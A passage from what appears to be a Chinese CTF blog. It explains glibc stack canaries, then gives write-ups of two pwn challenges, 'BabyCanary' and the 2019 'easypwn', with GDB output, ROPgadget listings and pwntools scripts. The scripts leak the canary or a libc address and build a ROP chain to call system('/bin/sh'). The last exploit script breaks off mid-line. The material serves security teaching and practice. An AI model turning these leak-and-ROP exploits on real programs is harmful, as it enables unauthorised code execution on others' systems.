而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。 Canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生. Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配 Canary 原理在 GCC 中使用 Canary可以在 GCC 中使用以下参数设置 Canary: 12345-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护-fno-stack-protector 禁用保护. Canary 实现原理开启 Canary 保护的 stack 结构大概如下 1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | canary value | +-----------------+ | 局部变量 | Low | | Address 当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下： 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。 1234mov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 如果 canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。 1234567891011121314eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; 这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。 事实上，TLS 中的值由函数 security_init 进行初始化。 12345678910111213141516171819static voidsecurity_init (void)&#123; // _dl_random的值在进入这个函数的时候就已经由kernel写入. // glibc直接使用了_dl_random的值并没有给赋值 // 如果不采用这种模式, glibc也可以自己产生随机数 //将_dl_random的最后一个字节设置为0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // 设置Canary的值到TLS中 THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL;&#125;//THREAD_SET_STACK_GUARD宏用于设置TLS#define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) 总的来说检测的机制是这样的： 1.程序从一个神奇的地方取出一个4（eax，32位系统）或8（rax，64位系统）节的值，在32位程序上，你可能会看到 在64位上，你可能会看到 放到栈上以后，eax中的副本也会被清空（xor eax,eax） 2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序 BabyCanary我们先检查一下程序情况 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 可以得知开启了Canary防护和NX防护 main函数 12345__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; sub_4006F9(); return 0LL;&#125; sub_4006F9函数 123456789101112unsigned __int64 sub_4006F9()&#123; char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"tell me your name:\"); read(0, &amp;buf, 0x100uLL); printf(\"OK,%s,let start!\\n\", &amp;buf); sub_400696(); return __readfsqword(0x28u) ^ v2;&#125; sub_4006F9函数中使用read函数获取输入，然后使用printf函数直接输出，存在格式化字符串漏洞，可以泄露内存 大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测 观察得到Canary的生成代码 12345678.text:00000000004006F9 push rbp.text:00000000004006FA mov rbp, rsp.text:00000000004006FD sub rsp, 90h.text:0000000000400704 ; 5: v2 = __readfsqword(0x28u);.text:0000000000400704 mov rax, fs:28h.text:000000000040070D mov [rbp+var_8], rax.text:0000000000400711 ; 6: puts(\"tell me your name:\");.text:0000000000400711 xor eax, eax 我们使用GDB调试，先下一个断点到0x00000000004006F9，查看一下汇编情况 1234567891011► 0x4006f9 push rbp 0x4006fa mov rbp, rsp 0x4006fd sub rsp, 0x90 0x400704 mov rax, qword ptr fs:[0x28] 0x40070d mov qword ptr [rbp - 8], rax 0x400711 xor eax, eax 0x400713 mov edi, 0x400824 0x400718 call 0x400560 0x40071d lea rax, [rbp - 0x90] 0x400724 mov edx, 0x100 0x400729 mov rsi, rax 一直单步运行直至异或eax寄存器 1234567891011 0x4006f9 push rbp 0x4006fa mov rbp, rsp 0x4006fd sub rsp, 0x90 0x400704 mov rax, qword ptr fs:[0x28] 0x40070d mov qword ptr [rbp - 8], rax► 0x400711 xor eax, eax 0x400713 mov edi, 0x400824 0x400718 call 0x400560 0x40071d lea rax, [rbp - 0x90] 0x400724 mov edx, 0x100 0x400729 mov rsi, rax 查看此时栈上的情况 1234567891011pwndbg&gt; x/20gx $rbp0x7fffffffde40: 0x00007fffffffde50 0x000000000040077e0x7fffffffde50: 0x0000000000400790 0x00007ffff7a2d8300x7fffffffde60: 0x00007fffffffdf38 0x00007fffffffdf380x7fffffffde70: 0x00000001f7b99608 0x00000000004007700x7fffffffde80: 0x0000000000000000 0x5dbdf3d3bbac9a430x7fffffffde90: 0x00000000004005a0 0x00007fffffffdf300x7fffffffdea0: 0x0000000000000000 0x00000000000000000x7fffffffdeb0: 0xa2420cac084c9a43 0xa2421c161b5c9a430x7fffffffdec0: 0x0000000000000000 0x00000000000000000x7fffffffded0: 0x0000000000000000 0x00007fffffffdf48 得知canary的值在[rbp - 8]处，则我们直接查看这里的值 123456789pwndbg&gt; telescope $rbp-800:0000│ 0x7fffffffde38 ◂— 0xca64b11c5d70610001:0008│ rbp 0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push r1502:0010│ 0x7fffffffde48 —▸ 0x40077e ◂— mov eax, 003:0018│ 0x7fffffffde50 —▸ 0x400790 ◂— push r1504:0020│ 0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax05:0028│ 0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— &apos;/home/syc/Documents/challange/babycanary/babycanary&apos;... ↓07:0038│ 0x7fffffffde70 ◂— 0x1f7b99608 可以得知Canary的值就是 0xca64b11c5d706100 但是问题是我们发现这题其实并不能使用格式化字符串实现泄露Canary的地址，因为它使用的是Read函数，并不会在后面添加“0/”截断，无法被解析也就无法利用格式化字符串漏洞。我们只能使用栈溢出直接输出Canary函数 我们先构造一个长度为90的字符串先尝试一下，下一个断点在0x0000000000400736(printf函数) 12syc@ubuntu:~/Documents/challange$ python pattern.py create 128Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae 然后运行在断点处查看栈结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950pwndbg&gt; stack 5000:0000│ rsi rsp 0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')01:0008│ 0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')02:0010│ 0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')03:0018│ 0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')04:0020│ 0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')05:0028│ 0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')06:0030│ 0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')07:0038│ 0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')08:0040│ 0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')09:0048│ 0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')0a:0050│ 0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')0b:0058│ 0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')0c:0060│ 0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')0d:0068│ 0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')0e:0070│ 0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')0f:0078│ 0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')10:0080│ 0x7fffffffde30 —▸ 0x40070a ◂— add byte ptr [rax], al11:0088│ 0x7fffffffde38 ◂— 0x8b5843fb32c0410012:0090│ rbp 0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push r1513:0098│ 0x7fffffffde48 —▸ 0x40077e ◂— mov eax, 014:00a0│ 0x7fffffffde50 —▸ 0x400790 ◂— push r1515:00a8│ 0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax16:00b0│ 0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'... ↓18:00c0│ 0x7fffffffde70 ◂— 0x1f7b9960819:00c8│ 0x7fffffffde78 —▸ 0x400770 ◂— push rbp1a:00d0│ 0x7fffffffde80 ◂— 0x01b:00d8│ 0x7fffffffde88 ◂— 0x4b03463a62f1fbbf1c:00e0│ 0x7fffffffde90 —▸ 0x4005a0 ◂— xor ebp, ebp1d:00e8│ 0x7fffffffde98 —▸ 0x7fffffffdf30 ◂— 0x11e:00f0│ 0x7fffffffdea0 ◂— 0x0... ↓20:0100│ 0x7fffffffdeb0 ◂— 0xb4fcb945d111fbbf21:0108│ 0x7fffffffdeb8 ◂— 0xb4fca9ffc201fbbf22:0110│ 0x7fffffffdec0 ◂— 0x0... ↓25:0128│ 0x7fffffffded8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2dd ◂— 'XDG_VTNR=7'26:0130│ 0x7fffffffdee0 —▸ 0x7ffff7ffe168 ◂— 0x027:0138│ 0x7fffffffdee8 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp 0x7ffff7de77b028:0140│ 0x7fffffffdef0 ◂— 0x0... ↓2a:0150│ 0x7fffffffdf00 —▸ 0x4005a0 ◂— xor ebp, ebp2b:0158│ 0x7fffffffdf08 —▸ 0x7fffffffdf30 ◂— 0x12c:0160│ 0x7fffffffdf10 ◂— 0x02d:0168│ 0x7fffffffdf18 —▸ 0x4005c9 ◂— hlt 2e:0170│ 0x7fffffffdf20 —▸ 0x7fffffffdf28 ◂— 0x1c2f:0178│ 0x7fffffffdf28 ◂— 0x1c30:0180│ r13 0x7fffffffdf30 ◂— 0x131:0188│ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— 从11:0088│ 0x7fffffffde38 ◂— 0x8b5843fb32c04100可以知道这就是Canary的值，那我们还需要增加字符串长度，正好溢出到canary的位置，则根据计算hex(30-28=8),则需要生成136个字符 12syc@ubuntu:~/Documents/challange$ python pattern.py create 136Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A 1234567891011121314151617181920pwndbg&gt; stack 5000:0000│ rax rsi rsp 0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')01:0008│ 0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')02:0010│ 0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')03:0018│ 0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')04:0020│ 0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')05:0028│ 0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')06:0030│ 0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')07:0038│ 0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')08:0040│ 0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')09:0048│ 0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')0a:0050│ 0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')0b:0058│ 0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')0c:0060│ 0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')0d:0068│ 0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')0e:0070│ 0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')0f:0078│ 0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')10:0080│ 0x7fffffffde30 ◂— 0x4134654133654132 ('2Ae3Ae4A')11:0088│ 0x7fffffffde38 ◂— 0xfb83dc38787b3d0a12:0090│ rbp 0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push r15 可以看到Canary的值就是0xfb83dc38787b3d0a 这样子我们可以写一个脚本来暴露Canary的值了 123456789#coding:utf-8from pwn import *r = process(\"./babycanary\")gdb.attach(r,\"b *0x400736\")payload = \"a\"*136r.sendlineafter(\"tell me your name:\\n\",payload)r.recvuntil('OK,'+ \"a\"*136)canary = u64(r.recv(8))print \"canary :\" + hex(canary) 运行后可以得到Canary的值为：0xbc2b48de6267a90a 123456789[DEBUG] Received 0xa5 bytes: 00000000 4f 4b 2c 61 61 61 61 61 61 61 61 61 61 61 61 61 │OK,a│aaaa│aaaa│aaaa│ 00000010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000080 61 61 61 61 61 61 61 61 61 61 61 0a a9 67 62 de │aaaa│aaaa│aaa·│·gb·│ 00000090 48 2b bc 70 cc 8b ca ff 7f 2c 6c 65 74 20 73 74 │H+·p│····│·,le│t st│ 000000a0 61 72 74 21 0a │art!│·│ 000000a5canary :0xbc2b48de6267a90a 通过GDB调试可以查看 12345678pwndbg&gt; stack 5000:0000│ rax rsi rsp 0x7fffca8bcbd0 ◂— 0x6161616161616161 ('aaaaaaaa')... ↓11:0088│ 0x7fffca8bcc58 ◂— 0xbc2b48de6267a90a12:0090│ rbp 0x7fffca8bcc60 —▸ 0x7fffca8bcc70 —▸ 0x400790 ◂— push r1513:0098│ 0x7fffca8bcc68 —▸ 0x40077e ◂— mov eax, 014:00a0│ 0x7fffca8bcc70 —▸ 0x400790 ◂— push r1515:00a8│ 0x7fffca8bcc78 —▸ 0x7fd06a5f1830 (__libc_start_main+240) 我们的脚本是正确的，我们已经获取了绕过Canary，接下来就是普通的栈溢出题目了 可以覆盖返回地址为pop pop pop pop ret指令地址，返回时弹出0x18个填充字节和返回地址,返回到buf+0x20处，就避开了栈不可执行 在buf+0x20处构造ROP，通过write函数，先泄露libc基地址，返回到start 重新执行，输入使之执行system(‘/bin/sh’) 需要用到的信息，包括bss段的地址、main函数地址、程序中已有函数的地址、gadgets地址","categories":[],"tags":[]},{"title":"黑盾杯-2019-PWN-easypwn","slug":"║┌╢▄▒¡-2019-PWN-easypwn","date":"2019-09-18T12:30:12.000Z","updated":"2019-09-19T03:30:44.000Z","comments":true,"path":"2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/","link":"","permalink":"http://yoursite.com/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/","excerpt":"","text":"首先检查一下程序保护措施 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 可以发现程序开启了NX保护即栈不可执行保护，我们再开启IDA Pro进行反汇编 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf; // [rsp+0h] [rbp-400h] setbuf(stdout, 0LL); setbuf(stdin, 0LL); write(1, \"Welcome to CTF\\n\", 0xFuLL); read(0, &amp;buf, 0x400uLL); sub_4006C6(&amp;buf); return 0LL;&#125; 然后我们查看sub_4006C6函数 123456int __fastcall sub_4006C6(const char *a1)&#123; char dest; // [rsp+10h] [rbp-10h] strcpy(&amp;dest, a1); return printf(\"%s\", &amp;dest);&#125; 我们可以发现到一个显著的栈溢出漏洞，可以看见read函数读取了长度为0x400(1024)的字符，然而sub_4006C6函数里面的可以看到栈桢的大小是10h 由于sub_4006C6函数的栈桢大小10h远小于read函数可以读取的数据长度400h，在进行循环赋值的时候，sub_4006C6函数保存在栈中的返回地址会被覆盖 我们进行动态调式验证一下我们的判断 12345678pwndbg&gt; b *0x00000000004006F6Breakpoint 1 at 0x4006f6pwndbg&gt; rStarting program: /mnt/hgfs/share/easypwn/easypwn Welcome to CTFaaaaaaaaaaaaaaaaBreakpoint 1, 0x00000000004006f6 in ?? () 我们查看一下栈上的情况 123456pwndbg&gt; stack 5000:0000│ rsp 0x7fffffffda60 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208b01:0008│ 0x7fffffffda68 —▸ 0x7fffffffda90 ◂— 0x6161616161616161 ('aaaaaaaa')02:0010│ rsi 0x7fffffffda70 ◂— 0x6161616161616161 ('aaaaaaaa')... ↓04:0020│ rdx rbp 0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1 我们可以发现函数的返回地址就是如下图所示，且即将被覆盖，超过0x18字节即会覆盖返回地址 104:0020│ rdx rbp 0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1 由于程序设置了栈不可执行，可以构造ROP链，泄露libc中的函数 64位程序和我们之前一直做的32位程序在传参数方式上有很大的不同 64位和32位的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007FFFFFFFFFFF，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX,R8和 R9中，如果还有更多的参数的话才会保存在栈上。 也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于pop rdi; ret的这种gadget， 由于sub_4006C6拷贝时，会被\\x00截断，所以不能连续覆盖多个地址来ROP， 在sub_4006C6函数ret处下断点，调试可以发现sub_4006C6返回地址下方即为read时的buf处 所以可以覆盖返回地址为pop pop pop pop ret指令地址，返回时弹出0x18个填充字节和返回地址,返回到buf+0x20处，就避开了栈不可执行 在buf+0x20处构造ROP，通过write函数，先泄露libc基地址，返回到start 重新执行，输入使之执行system(‘/bin/sh’) 需要用到的信息，包括bss段的地址、main函数地址、程序中已有函数的地址、gadgets地址 所以我们直接只用ROP gadgets工具寻找64位环境下可以使用的gadgets 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475syc@ubuntu:~/Documents/Untitled Folder$ ROPgadget --binary easypwnGadgets information============================================================0x0000000000400622 : adc byte ptr [rax], ah ; jmp rax0x000000000040061e : adc dword ptr [rbp - 0x41], ebx ; pop rax ; adc byte ptr [rax], ah ; jmp rax0x00000000004007ef : add bl, dh ; ret0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret0x000000000040076d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret0x000000000040062c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret0x00000000004007ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret0x000000000040076e : add byte ptr [rax], al ; add cl, cl ; ret0x000000000040053b : add byte ptr [rax], al ; add rsp, 8 ; ret0x000000000040076f : add byte ptr [rax], al ; leave ; ret0x000000000040062e : add byte ptr [rax], al ; pop rbp ; ret0x00000000004007ee : add byte ptr [rax], al ; ret0x0000000000400698 : add byte ptr [rcx], al ; ret0x0000000000400770 : add cl, cl ; ret0x0000000000400694 : add eax, 0x2009de ; add ebx, esi ; ret0x0000000000400699 : add ebx, esi ; ret0x000000000040053e : add esp, 8 ; ret0x000000000040053d : add rsp, 8 ; ret0x0000000000400697 : and byte ptr [rax], al ; add ebx, esi ; ret0x00000000004007c9 : call qword ptr [r12 + rbx*8]0x00000000004007ca : call qword ptr [rsp + rbx*8]0x00000000004006be : call rax0x00000000004006fa : dec ecx ; ret0x0000000000400695 : fimul word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret0x00000000004006b9 : int1 ; push rbp ; mov rbp, rsp ; call rax0x000000000040061d : je 0x400638 ; pop rbp ; mov edi, 0x601058 ; jmp rax0x000000000040066b : je 0x400680 ; pop rbp ; mov edi, 0x601058 ; jmp rax0x00000000004006b8 : je 0x4006b1 ; push rbp ; mov rbp, rsp ; call rax0x0000000000400625 : jmp rax0x00000000004006fb : leave ; ret0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret0x000000000040076c : mov eax, 0 ; leave ; ret0x00000000004006bc : mov ebp, esp ; call rax0x0000000000400620 : mov edi, 0x601058 ; jmp rax0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]0x00000000004006bb : mov rbp, rsp ; call rax0x0000000000400628 : nop dword ptr [rax + rax] ; pop rbp ; ret0x00000000004007e8 : nop dword ptr [rax + rax] ; ret0x0000000000400675 : nop dword ptr [rax] ; pop rbp ; ret0x0000000000400696 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret0x000000000040066c : or ebx, dword ptr [rbp - 0x41] ; pop rax ; adc byte ptr [rax], ah ; jmp rax0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007e0 : pop r14 ; pop r15 ; ret0x00000000004007e2 : pop r15 ; ret0x0000000000400621 : pop rax ; adc byte ptr [rax], ah ; jmp rax0x0000000000400692 : pop rbp ; mov byte ptr [rip + 0x2009de], 1 ; ret0x000000000040061f : pop rbp ; mov edi, 0x601058 ; jmp rax0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007e3 : pop rdi ; ret0x00000000004007e1 : pop rsi ; pop r15 ; ret0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ba : push rbp ; mov rbp, rsp ; call rax0x0000000000400541 : ret0x0000000000400296 : retf0x000000000040066a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax0x000000000040061c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax0x00000000004006b7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret0x000000000040062a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret0x00000000004006b6 : test eax, eax ; je 0x4006b3 ; push rbp ; mov rbp, rsp ; call rax0x00000000004006b5 : test rax, rax ; je 0x4006b4 ; push rbp ; mov rbp, rsp ; call raxUnique gadgets found: 69 不过这样子有点太乱了，我们一般只需要使用pop、ret、mov类型的gadgets，所以我们再查一查 12345678910111213141516syc@ubuntu:/mnt/hgfs/share/easypwn$ ROPgadget --binary easypwn --only \"pop|ret\"Gadgets information============================================================0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007e0 : pop r14 ; pop r15 ; ret0x00000000004007e2 : pop r15 ; ret0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007e3 : pop rdi ; ret0x00000000004007e1 : pop rsi ; pop r15 ; ret0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : retUnique gadgets found: 11 123456780x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret0x000000000040076c : mov eax, 0 ; leave ; ret0x00000000004006bc : mov ebp, esp ; call rax0x0000000000400620 : mov edi, 0x601058 ; jmp rax0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]0x00000000004006bb : mov rbp, rsp ; call rax 其实这题有坑，其实是存在我们常用的gadgets的，只是工具没有搜索出来，然后也没有标识__libc_csu_init()这个函数，就需要我们自己多去看看题目 12345678910111213141516171819202122232425262728293031323334353637383940.text:0000000000400780 ; __unwind &#123;.text:0000000000400780 push r15.text:0000000000400782 push r14.text:0000000000400784 mov r15d, edi.text:0000000000400787 push r13.text:0000000000400789 push r12.text:000000000040078B lea r12, off_600E10.text:0000000000400792 push rbp.text:0000000000400793 lea rbp, off_600E18.text:000000000040079A push rbx.text:000000000040079B mov r14, rsi.text:000000000040079E mov r13, rdx.text:00000000004007A1 sub rbp, r12.text:00000000004007A4 sub rsp, 8.text:00000000004007A8 sar rbp, 3.text:00000000004007AC call _init_proc.text:00000000004007B1 test rbp, rbp.text:00000000004007B4 jz short loc_4007D6.text:00000000004007B6 xor ebx, ebx.text:00000000004007B8 nop dword ptr [rax+rax+00000000h].text:00000000004007C0.text:00000000004007C0 loc_4007C0: ; CODE XREF: init+54↓j.text:00000000004007C0 mov rdx, r13.text:00000000004007C3 mov rsi, r14.text:00000000004007C6 mov edi, r15d.text:00000000004007C9 call qword ptr [r12+rbx*8].text:00000000004007CD add rbx, 1.text:00000000004007D1 cmp rbx, rbp.text:00000000004007D4 jnz short loc_4007C0.text:00000000004007D6.text:00000000004007D6 loc_4007D6: ; CODE XREF: init+34↑j.text:00000000004007D6 add rsp, 8.text:00000000004007DA pop rbx.text:00000000004007DB pop rbp.text:00000000004007DC pop r12.text:00000000004007DE pop r13.text:00000000004007E0 pop r14.text:00000000004007E2 pop r15.text:00000000004007E4 retn.text:00000000004007E4 ; &#125; // starts at 400780 然后就是套路模板EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *io=process('./easypwn')elf=ELF(\"./easypwn\")libc=ELF(\"./libc-2.23.so\")got_write = elf.got['write']got_read = elf.got['read']main_addr = 0x4006FDpop_rdi_ret = 0x4007E3# pop rdi retpop4_r12_ret = 0x4007DC# pop r12 r13 r14 r15pop6_rbx_ret = 0x4007DA# pop rbx rbp r12 r13 r14 r15mov_rdx_rsi_edi_call = 0x4007C0#mov rdx, r13 mov rsi, r14 mov di, r15d call qword ptr [r12+rbx*8]if __name__ ==\"__main__\": io.recvuntil(\"Welcome to CTF\\n\") got_write = elf.got['write'] payload=0x18*\"a\" + p64(pop4_r12_ret) payload+=p64(pop6_rbx_ret)+ p64(0x0) + p64(0x1) + p64(got_write) payload+=p64(8) + p64(got_write) + p64(1) + p64(mov_rdx_rsi_edi_call) payload+='a'*56 payload+=p64(main_addr) io.sendline(payload) io.recvuntil(0x18*\"a\") io.recv(3) write_addr=u64(io.recv(6).ljust(8,'\\x00')) print \"write_addr:\"+hex(write_addr) libc_base_addr=write_addr-libc.sym['write'] print \"libc_base_addr:\"+hex(libc_base_addr) system_addr=libc_base_addr+libc.sym['system'] print \"system_addr:\"+hex(system_addr) bbs_addr = elf.bss() payload = 0x18*\"a\" payload += p64(pop4_r12_ret) payload += p64(pop6_rbx_ret) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bbs_addr) + p64(0) payload += p64(mov_rdx_rsi_edi_call) payload += \"A\" * 56 payload += p64(pop_rdi_ret) payload += p64(bbs_addr) payload += p64(system_addr) io.recvuntil('Welcome to CTF\\n') print \"\\n#############sending 